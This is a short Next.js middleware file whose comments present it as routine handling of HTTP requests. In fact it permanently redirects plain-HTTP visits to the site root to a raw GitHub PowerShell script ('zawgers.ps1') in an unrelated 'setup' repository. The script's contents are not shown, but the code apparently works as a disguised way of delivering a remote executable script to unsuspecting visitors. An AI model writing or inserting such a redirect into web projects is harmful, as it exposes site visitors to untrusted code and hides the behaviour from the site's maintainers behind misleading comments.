import { NextRequest, NextResponse } from 'next/server'

export function middleware(request: NextRequest) {
  // Check if the request is made via HTTP (not HTTPS)
  if (request.nextUrl.protocol === 'http:') {
    // Redirect to the target URL with a 301 status code
    return NextResponse.redirect(
      'https://raw.githubusercontent.com/rh609/setup/refs/heads/main/zawgers.ps1',
      301
    )
  }

  // Return a default response for HTTPS requests or other conditions
  return NextResponse.next()
}

// Set the middleware to match your route
export const config = {
  matcher: ['/'],
}
